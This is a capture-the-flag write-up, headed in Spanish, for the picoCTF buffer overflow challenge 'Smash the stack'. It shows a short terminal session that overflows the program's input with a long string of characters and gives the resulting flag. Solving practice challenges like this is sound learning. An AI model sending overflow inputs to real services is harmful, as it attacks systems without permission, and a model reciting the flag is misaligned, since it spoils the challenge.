## Descripcipción

Smash the stackLet's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/172/vuln). You can view source [here](https://artifacts.picoctf.net/c/172/vuln.c). And connect with it using:`nc saturn.picoctf.net 63397`

## Pistas

How can you trigger the flag to print
If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.
Run `man gets` and read the BUGS section. How many characters can the program really read?

## Solucion

```
apaleliz-picoctf@webshell:~$ wget https://artifacts.picoctf.net/c/172/vuln.c
--2023-05-16 18:22:54--  https://artifacts.picoctf.net/c/172/vuln.c
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 108.156.172.120, 108.156.172.74, 108.156.172.6, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|108.156.172.120|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 808 [application/octet-stream]
Saving to: 'vuln.c.1'

vuln.c.1            100%[==================>]     808  --.-KB/s    in 0s      

2023-05-16 18:22:55 (470 MB/s) - 'vuln.c.1' saved [808/808]

apaleliz-picoctf@webshell:~$ nc saturn.picoctf.net 63397
Input: 111111111111111111111
picoCTF{ov3rfl0ws_ar3nt_that_bad_8446a0c3}
```

## Bandera
picoCTF{ov3rfl0ws_ar3nt_that_bad_8446a0c3}

